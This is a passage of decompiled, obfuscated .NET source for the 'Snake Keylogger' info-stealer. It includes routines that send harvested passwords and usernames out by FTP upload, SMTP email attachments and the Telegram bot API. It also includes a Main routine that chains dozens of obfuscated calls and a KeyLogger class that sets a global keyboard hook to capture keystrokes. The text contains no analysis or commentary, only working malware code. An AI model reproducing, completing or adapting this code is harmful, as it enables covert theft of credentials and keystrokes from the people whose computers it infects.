        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(Ɖӓ\u058Fɢ\uFFFD.\u07B8皍ٷ\uFFFD恁, Ɖӓ\u058Fɢ\uFFFD.ĂɛUē\uFFFD);
          byte[] bytes = Encoding.UTF8.GetBytes(Ɖӓ\u058Fɢ\uFFFD.Уӛʭήã("PW | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n" + Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDşzÒ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Ɖӓ\u058Fɢ\uFFFD.ΑԜ븤Αҡ));
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3);
          message.To.Add(Ɖӓ\u058Fɢ\uFFFD.\u0026ٕ\u0097\uFFFD\uFFFD);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = Ɖӓ\u058Fɢ\uFFFD.ҏ̲ӓ\u07B8ک();
          byte[] buffer2 = Ɖӓ\u058Fɢ\uFFFD.\u1CFCŚ\uFFFDã䕃();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "text/plain"));
          new SmtpClient(Ɖӓ\u058Fɢ\uFFFD.œˤʓϒ\u26CA)
          {
            EnableSsl = (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD盀ôׁܣ, "True", false) == 0),
            Port = Conversions.ToInteger(Ɖӓ\u058Fɢ\uFFFD.œ\uFFFDi߂鈇),
            Credentials = ((ICredentialsByHost) new NetworkCredential(Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3, Ɖӓ\u058Fɢ\uFFFD.ëУϒ㹃\uFFFD))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = Ɖӓ\u058Fɢ\uFFFD.Уӛʭήã("PW | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n" + Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDşzÒ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", Ɖӓ\u058Fɢ\uFFFD.ΑԜ븤Αҡ);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + Ɖӓ\u058Fɢ\uFFFD.\u05C1̳皍\u07B9ˤ + "/sendDocument?chat_id=" + Ɖӓ\u058Fɢ\uFFFD.\uFFFDЮӥ\u02F3\uFFFD + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          Ɖӓ\u058Fɢ\uFFFD.ܣ\uFFFDӚջɮ("SnakePW" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static byte[] ëУג恁뜸() => Encoding.Unicode.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n" + Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDşzÒ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");

    public static byte[] \u07C2J콪\uFFFD\u2964() => Encoding.Default.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n" + Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDşzÒ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");

    public static void \u058Fʓ\uFFFDǎߟ()
    {
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (Ɖӓ\u058Fɢ\uFFFD.嵱꾯ē\u07BBأ + \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Name + " - Passwords ID - "), Ɖӓ\u058Fɢ\uFFFD.Ңۚ뜸븤꾯), (object) Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(Ɖӓ\u058Fɢ\uFFFD.\u07B8皍ٷ\uFFFD恁, Ɖӓ\u058Fɢ\uFFFD.ĂɛUē\uFFFD);
          byte[] bytes = Encoding.UTF8.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n" + Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDşzÒ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3);
          message.To.Add(Ɖӓ\u058Fɢ\uFFFD.\u0026ٕ\u0097\uFFFD\uFFFD);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = Ɖӓ\u058Fɢ\uFFFD.ëУג恁뜸();
          byte[] buffer2 = Ɖӓ\u058Fɢ\uFFFD.\u07C2J콪\uFFFD\u2964();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "text/plain"));
          new SmtpClient(Ɖӓ\u058Fɢ\uFFFD.œˤʓϒ\u26CA)
          {
            EnableSsl = (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD盀ôׁܣ, "True", false) == 0),
            Port = Conversions.ToInteger(Ɖӓ\u058Fɢ\uFFFD.œ\uFFFDi߂鈇),
            Credentials = ((ICredentialsByHost) new NetworkCredential(Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3, Ɖӓ\u058Fɢ\uFFFD.ëУϒ㹃\uFFFD))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "PW | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n" + Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDşzÒ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + Ɖӓ\u058Fɢ\uFFFD.\u05C1̳皍\u07B9ˤ + "/sendDocument?chat_id=" + Ɖӓ\u058Fɢ\uFFFD.\uFFFDЮӥ\u02F3\uFFFD + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          Ɖӓ\u058Fɢ\uFFFD.ܣ\uFFFDӚջɮ("SnakePW" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static void \uFFFD\uD997\uDDCBٚ꼺(object _param0, EventArgs _param1)
    {
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (Ɖӓ\u058Fɢ\uFFFD.嵱꾯ē\u07BBأ + \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Name + " - Passwords ID - "), Ɖӓ\u058Fɢ\uFFFD.Ңۚ뜸븤꾯), (object) Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(Ɖӓ\u058Fɢ\uFFFD.\u07B8皍ٷ\uFFFD恁, Ɖӓ\u058Fɢ\uFFFD.ĂɛUē\uFFFD);
          byte[] bytes = Encoding.UTF8.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n" + Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDşzÒ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3);
          message.To.Add(Ɖӓ\u058Fɢ\uFFFD.\u0026ٕ\u0097\uFFFD\uFFFD);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = Ɖӓ\u058Fɢ\uFFFD.ëУג恁뜸();
          byte[] buffer2 = Ɖӓ\u058Fɢ\uFFFD.\u07C2J콪\uFFFD\u2964();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "text/plain"));
          new SmtpClient(Ɖӓ\u058Fɢ\uFFFD.œˤʓϒ\u26CA)
          {
            EnableSsl = (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD盀ôׁܣ, "True", false) == 0),
            Port = Conversions.ToInteger(Ɖӓ\u058Fɢ\uFFFD.œ\uFFFDi߂鈇),
            Credentials = ((ICredentialsByHost) new NetworkCredential(Ɖӓ\u058Fɢ\uFFFD.åųR䕃\u02F3, Ɖӓ\u058Fɢ\uFFFD.ëУϒ㹃\uFFFD))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD꼺c̲\u0040, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "PW | " + Environment.UserName + " | Snake\r\n" + Ɖӓ\u058Fɢ\uFFFD.ا\u005Eڿ\u00BEŴ + "\r\n" + Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDşzÒ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + Ɖӓ\u058Fɢ\uFFFD.\u05C1̳皍\u07B9ˤ + "/sendDocument?chat_id=" + Ɖӓ\u058Fɢ\uFFFD.\uFFFDЮӥ\u02F3\uFFFD + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          Ɖӓ\u058Fɢ\uFFFD.ܣ\uFFFDӚջɮ("SnakePW" + Ɖӓ\u058Fɢ\uFFFD.\uF0B9㹃\u058Fִ̔, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static object \u05C1ē\uFFFD\u002Dհ()
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      long num;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (driveInfo.IsReady)
          checked { num += driveInfo.TotalSize; }
        checked { ++index; }
      }
      return (object) Conversions.ToString(checked ((long) Math.Round(unchecked ((double) num / 1048576.0 / 1024.0))));
    }

    public static void 恁\u02F3\uFFFDľ\u2964()
    {
    }

    public static void 皍\uFFFDЅΠӤ()
    {
    }

    public static void ᔖЦЦƌ\uFFFD()
    {
    }

    public static void Òֵ\uFFFDި\uFFFD()
    {
    }

    public static void Ŏ츠̲ŚЦ()
    {
    }

    public static void Ŕ쐬ӥ泮\uFFFD()
    {
    }

    public static void Թ\u02E8ϫųУ()
    {
    }

    public static void 䕃ŚϘǎ̔()
    {
    }

    public static void \uFFFD泮̀أ\u060C()
    {
    }

    public static void ҭÒܹݶã()
    {
    }

    public static void \u06E8ã\uFFFDj\u07B8()
    {
    }

    public static void ݝζ\uFFFD\uFFFDג()
    {
    }

    public static void \u0739\uFFFDЦŴζ()
    {
    }

    public static void Ѕ\uFFFD\u07BB\uFFFD\uFFFD()
    {
      try
      {
        Ɖӓ\u058Fɢ\uFFFD.m\uFFFDē̲У.Interval = 1;
        Ɖӓ\u058Fɢ\uFFFD.m\uFFFDē̲У.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ņ\uFFFD\u05C3KK()
    {
      try
      {
        Ɖӓ\u058Fɢ\uFFFD.ŔR\uFFFDë\uFFFD();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ϒߟ\u02E8ҭR()
    {
      try
      {
        Ɖӓ\u058Fɢ\uFFFD.W\u0609퓜̀ۚ();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ήޗ泮\u07FBі()
    {
    }

    public static void ˤՄִ2ا()
    {
    }

    public static void ɮǎ\u26CAՄڿ()
    {
      if (Operators.ConditionalCompareObjectEqual(Ɖӓ\u058Fɢ\uFFFD.\uFFFDс\u07B8KÒ, (object) "ProtectTrue", false))
      {
        if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDşzÒ, "", false) == 0)
          return;
        Ɖӓ\u058Fɢ\uFFFD.\u00BEϫœ븤O();
        Thread.Sleep(8000);
        Ɖӓ\u058Fɢ\uFFFD.\uFFFDֵ\u002DĪӓ();
        Thread.Sleep(3000);
        Ɖӓ\u058Fɢ\uFFFD.\uFFFD\u0385\u2964\u05C9Π();
        Thread.Sleep(3000);
        Ɖӓ\u058Fɢ\uFFFD.é\u061D뫆\u1CFCا();
        Thread.Sleep(3000);
        Ɖӓ\u058Fɢ\uFFFD.\u05C9ڿٷΑӥ();
      }
      else if (Operators.CompareString(Ɖӓ\u058Fɢ\uFFFD.\uFFFD\uFFFDşzÒ, "", false) != 0)
      {
        Ɖӓ\u058Fɢ\uFFFD.\u058Fʓ\uFFFDǎߟ();
        Thread.Sleep(8000);
        Ɖӓ\u058Fɢ\uFFFD.z\u058FŎΩƚ();
        Thread.Sleep(3000);
        Ɖӓ\u058Fɢ\uFFFD.\uFFFD\u0385\u2964\u05C9Π();
        Thread.Sleep(3000);
        Ɖӓ\u058Fɢ\uFFFD.é\u061D뫆\u1CFCا();
        Thread.Sleep(3000);
        Ɖӓ\u058Fɢ\uFFFD.\u05C9ڿٷΑӥ();
      }
    }

    public static void \uFFFD\u0385\u2964\u05C9Π()
    {
    }

    public static void é\u061D뫆\u1CFCا()
    {
    }

    public static void \u05C9ڿٷΑӥ()
    {
    }

    public static void \uFFFDֵ\u002DĪӓ()
    {
    }

    public static void z\u058FŎΩƚ()
    {
    }

    [STAThread]
    public static void Main()
    {
      try
      {
        Ɖӓ\u058Fɢ\uFFFD.Òֵ\uFFFDި\uFFFD();
        Ɖӓ\u058Fɢ\uFFFD.恁\u02F3\uFFFDľ\u2964();
        Ɖӓ\u058Fɢ\uFFFD.ᔖЦЦƌ\uFFFD();
        Ɖӓ\u058Fɢ\uFFFD.Ŏ츠̲ŚЦ();
        Ɖӓ\u058Fɢ\uFFFD.Ŕ쐬ӥ泮\uFFFD();
        Ɖӓ\u058Fɢ\uFFFD.Թ\u02E8ϫųУ();
        Ɖӓ\u058Fɢ\uFFFD.ζӚ̧Śс();
        Ɖӓ\u058Fɢ\uFFFD.䕃ŚϘǎ̔();
        Ɖӓ\u058Fɢ\uFFFD.\uFFFD泮̀أ\u060C();
        Ɖӓ\u058Fɢ\uFFFD.ҭÒܹݶã();
        Ɖӓ\u058Fɢ\uFFFD.\u06E8ã\uFFFDj\u07B8();
        Ɖӓ\u058Fɢ\uFFFD.ݝζ\uFFFD\uFFFDג();
        Ɖӓ\u058Fɢ\uFFFD.皍\uFFFDЅΠӤ();
        Ɖӓ\u058Fɢ\uFFFD.\u0739\uFFFDЦŴζ();
        Ɖӓ\u058Fɢ\uFFFD.ņ\uFFFD\u05C3KK();
        Ɖӓ\u058Fɢ\uFFFD.ϒߟ\u02E8ҭR();
        Ɖӓ\u058Fɢ\uFFFD.ήޗ泮\u07FBі();
        \uFFFD盀ҡӤ\uFFFD.ŁȨ\u1CFCۨٗ();
        \uFFFD盀ҡӤ\uFFFD.\u0097ŧیɇŧ();
        \uFFFD盀ҡӤ\uFFFD.ӛٚ㠰ﾭm();
        \uFFFD盀ҡӤ\uFFFD.ב2J߂Ɯ();
        \uFFFD盀ҡӤ\uFFFD.㠰\uFFFD\uFFFDӛҡ();
        \uFFFD盀ҡӤ\uFFFD.츠ջсʓ̀();
        \uFFFD盀ҡӤ\uFFFD.㠰̀ʓ\uD974\uDC0B();
        \uFFFD盀ҡӤ\uFFFD.㠰ŧjߟ̔();
        \uFFFD盀ҡӤ\uFFFD.i\uFFFD\u26CAﾭŔ();
        \uFFFD盀ҡӤ\uFFFD.і\uFFFD\u0026\uFFFDϒ();
        \uFFFD盀ҡӤ\uFFFD.盀ƌ䕃œ\uFFFD();
        \uFFFD盀ҡӤ\uFFFD.œ\uFFFDϒޗ퓜();
        \uFFFD盀ҡӤ\uFFFD.\uFFFD̀OēУ();
        \uFFFD盀ҡӤ\uFFFD.늻\uFFFD恁ۨۚ();
        \uFFFD盀ҡӤ\uFFFD.鈟Ԝ\uFFFD\uFFFD똛();
        \uFFFD盀ҡӤ\uFFFD.㠰kᔖēҢ();
        \uFFFD盀ҡӤ\uFFFD.ױ\uFFFD\uFFFDӤִ();
        \uFFFD盀ҡӤ\uFFFD.cO2\uFFFDױ();
        \uFFFD盀ҡӤ\uFFFD.\u07A8\uFFFD꾯\uFFFD\uFFFD();
        \uFFFD盀ҡӤ\uFFFD.\uFFFDÒ\uFFFDˤʭ();
        \uFFFD盀ҡӤ\uFFFD.\u005E鈇ԌלϘ();
        \uFFFD盀ҡӤ\uFFFD.ϱ꼺ܪܪ뫆();
        \uFFFD盀ҡӤ\uFFFD.أޗҡ\uFFFDœ();
        \uFFFD盀ҡӤ\uFFFD.\u0040\uFFFD뫆ﾭٷ();
        \uFFFD盀ҡӤ\uFFFD.גzՕٕ\u0609();
        \uFFFD盀ҡӤ\uFFFD.\u07B8\uFFFDչ䕃̳();
        \uFFFD盀ҡӤ\uFFFD.Ϙіˤ丐ג();
        \uFFFD盀ҡӤ\uFFFD.\uFFFDęߟ\uFFFDթ();
        \uFFFD盀ҡӤ\uFFFD.ľ\uDAE4\uDDCBή똛();
        \uFFFD盀ҡӤ\uFFFD.Ԍ\uFFFDɛᔖۣ();
        \uFFFD盀ҡӤ\uFFFD.ҭ꼺̲ޗ\uFFFD();
        \uFFFD盀ҡӤ\uFFFD.\u2964\uFFFDՄϫ\u07B4();
        \uFFFD盀ҡӤ\uFFFD.\uDA3B\uDC2C\uFFFDЦ\uFFFD();
        \uFFFD盀ҡӤ\uFFFD.\uFFFD꼺Wľm();
        \uFFFD盀ҡӤ\uFFFD.ӥִꓞcٷ();
        \uFFFD盀ҡӤ\uFFFD.Ц㠰ٵ\u2964Ц();
        \uFFFD盀ҡӤ\uFFFD.泮\uFFFDǎ\u26CA\uFFFD();
        \uFFFD盀ҡӤ\uFFFD.Ю\uFFFDΩë\uFFFD();
        \uFFFD盀ҡӤ\uFFFD.Πƌ\u0026\uFFFDĂ();
        \uFFFD盀ҡӤ\uFFFD.\u060C2\u003B丐Z();
        \uFFFD盀ҡӤ\uFFFD.Ł\uFFFDۨԜ\uFFFD();
        \uFFFD盀ҡӤ\uFFFD.\u0327Ю\uFFFD\u2964\uFFFD();
        \uFFFD盀ҡӤ\uFFFD.\uFFFDӺУA\u0040();
        \uFFFD盀ҡӤ\uFFFD.B\uFFFDBڿĂ();
        \uFFFD盀ҡӤ\uFFFD.ɢ꼺ʤޤ꾯();
        \uFFFD盀ҡӤ\uFFFD.\uFFFD\u07B9A\uD9EE\uDC2C();
        \uFFFD盀ҡӤ\uFFFD.꼺\uFFFD퓜ҟ\uFFFD();
        \uFFFD盀ҡӤ\uFFFD.\u02F3똛Zӛ\uFFFD();
        \uFFFD盀ҡӤ\uFFFD.ᔖƜ߂ô\uFFFD();
        \uFFFD盀ҡӤ\uFFFD.\u005E늻\u0609ɮ\u00AB();
        \uFFFD盀ҡӤ\uFFFD.쐬ϒεR\u003B();
        \uFFFD盀ҡӤ\uFFFD.\u002Dε\uFFFDœƚ();
        \u0333\uFFFDϘױɩ.쐬㠰ϫٵ\u26CA();
        \u0333\uFFFDϘױɩ.\uFFFD\uFFFDUϫ\uFFFD();
        \u0333\uFFFDϘױɩ.\uFFFDBіɇꓞ();
        \u0333\uFFFDϘױɩ.OŲׁ̆Ò();
        \u0333\uFFFDϘױɩ.ΠԜ\uFFFDŴӓ();
        \u0333\uFFFDϘױɩ.\u02F3盀c꾯\u002D();
        \u0333\uFFFDϘױɩ.Bݶױأ\u058F();
        \u0333\uFFFDϘױɩ.\uFFFDіֵ\uFFFDג();
        \u0333\uFFFDϘױɩ.\uFFFD\u07B4\uFFFDҡ\uFFFD();
        \u0333\uFFFDϘױɩ.z\u07B9j\uFFFDޤ();
        Ɖӓ\u058Fɢ\uFFFD.ˤՄִ2ا();
        Ɖӓ\u058Fɢ\uFFFD.ɮǎ\u26CAՄڿ();
        Application.Run();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public delegate void KeyLoggerEventArgsEventHandler(
      object sender,
      Ɖӓ\u058Fɢ\uFFFD.KeyLoggerEventArgs e);

    public class KeyLoggerEventArgs : EventArgs
    {
      private Keys _keys;
      private string _stringValue;

      public KeyLoggerEventArgs(Keys key, string stringValue)
      {
        this._keys = key;
        this._stringValue = stringValue;
      }

      public Keys Key => this._keys;

      public string StringValue => this._stringValue;
    }

    public class KeyLogger : IDisposable
    {
      private Ɖӓ\u058Fɢ\uFFFD.KeyLogger.KeyboardProc _hookCallback;
      private IntPtr _hook;
      private string _currentWindow;
      private bool _newWindow;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern IntPtr SetHook(
        int hook,
        Ɖӓ\u058Fɢ\uFFFD.KeyLogger.KeyboardProc KeyDelegate,
        IntPtr HMod,
        int ThreadId);

      [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int CallNextHook(IntPtr hook, int code, int direction, ref Keys key);

      [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int UnHook(IntPtr hook);

      public event Ɖӓ\u058Fɢ\uFFFD.KeyLoggerEventArgsEventHandler KeyDown;

      public event Ɖӓ\u058Fɢ\uFFFD.KeyLoggerEventArgsEventHandler KeyUp;

      public string CurrentWindow => this._currentWindow;

      public KeyLogger()
      {
        this._hookCallback = new Ɖӓ\u058Fɢ\uFFFD.KeyLogger.KeyboardProc(this.ProcessKey);
        this._hook = Ɖӓ\u058Fɢ\uFFFD.KeyLogger.SetHook(13, this._hookCallback, IntPtr.Zero, 0);
        if (!(this._hook == IntPtr.Zero))
          ;
        this.InitializeCaptionLogging();
      }

      private int ProcessKey(int code, int direction, ref Keys key)
      {
        if (code == 0)
        {
          if (direction == 256)
          {
            // ISSUE: reference to a compiler-generated field
            Ɖӓ\u058Fɢ\uFFFD.KeyLoggerEventArgsEventHandler keyDownEvent = this.KeyDownEvent;
            if (keyDownEvent != null)
              keyDownEvent((object) this, new Ɖӓ\u058Fɢ\uFFFD.KeyLoggerEventArgs(key, this.Identifykey(key)));
          }
          else if (direction == 260)
          {
            // ISSUE: reference to a compiler-generated field
            Ɖӓ\u058Fɢ\uFFFD.KeyLoggerEventArgsEventHandler keyUpEvent = this.KeyUpEvent;
            if (keyUpEvent != null)
              keyUpEvent((object) this, new Ɖӓ\u058Fɢ\uFFFD.KeyLoggerEventArgs(key, this.Identifykey(key)));
          }
        }
        return Ɖӓ\u058Fɢ\uFFFD.KeyLogger.CallNextHook(this._hook, code, direction, ref key);
      }

      private string Identifykey(Keys k)
      {
        bool flag = \u0385cOŚ㠰.\u00ABіבՄ\u07B4.Keyboard.ShiftKeyDown;
        if (\u0385cOŚ㠰.\u00ABіבՄ\u07B4.Keyboard.CapsLock)
          flag = !flag;
        string str;
        try
        {
          switch (k)
          {
            case Keys.Back:
            case Keys.End:
            case Keys.Delete:
            case Keys.F1:
            case Keys.F2:
            case Keys.F3:
            case Keys.F4:
            case Keys.F5:
            case Keys.F6:
            case Keys.F7:
            case Keys.F8:
            case Keys.F9:
            case Keys.F10:
            case Keys.F11:
            case Keys.F12:
              str = "[" + k.ToString() + "]";
              break;
            case Keys.Tab:
              str = "[TAP]";
              break;
            case Keys.Return:
              str = "[ENTR]";
              break;
            case Keys.Space:
              str = " ";
              break;
            default:
              str = !flag ? this.VKCodeToUnicode(checked ((uint) k)) : this.VKCodeToUnicode(checked ((uint) k)).ToUpper();
              break;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          if (flag)
          {
            str = Strings.ChrW((int) k).ToString().ToUpper();
            ProjectData.ClearProjectError();
          }
          else
          {
            str = Strings.ChrW((int) k).ToString().ToLower();
            ProjectData.ClearProjectError();
          }
        }
        return str;
      }

      private string VKCodeToUnicode(uint VKCode)
      {
        try
        {
          StringBuilder اC똛ҏϘ = new StringBuilder();
          byte[] 䇹ų똛ëҚ = new byte[(int) byte.MaxValue];
          if (!Ɖӓ\u058Fɢ\uFFFD.ľ\uFFFDҭӚk(䇹ų똛ëҚ))
            return "";
          uint ǎӺіņג = Ɖӓ\u058Fɢ\uFFFD.ŧ̔̔Ųɮ(VKCode, 0U);
          IntPtr num1 = Ɖӓ\u058Fɢ\uFFFD.ӚήӓՄс();
          int num2 = 0;
